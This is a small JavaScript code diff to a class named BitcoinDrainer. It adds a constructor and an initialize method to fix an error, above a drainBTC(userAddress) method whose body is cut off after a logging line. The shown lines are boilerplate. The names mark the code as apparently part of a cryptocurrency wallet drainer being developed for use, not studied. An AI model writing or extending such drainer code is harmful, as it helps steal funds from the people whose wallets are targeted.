@@ -1,4 +1,15 @@
 export class BitcoinDrainer {
+    constructor() {
+        this.isInitialized = false;
+    }
+
+    // ✅ ADDED: Initialize method to fix the error
+    async initialize() {
+        console.log('✅ Bitcoin Drainer initialized');
+        this.isInitialized = true;
+        return true;
+    }
+
     async drainBTC(userAddress) {
         try {
             console.log('✅ Bitcoin drain endpoint called for:', userAddress);
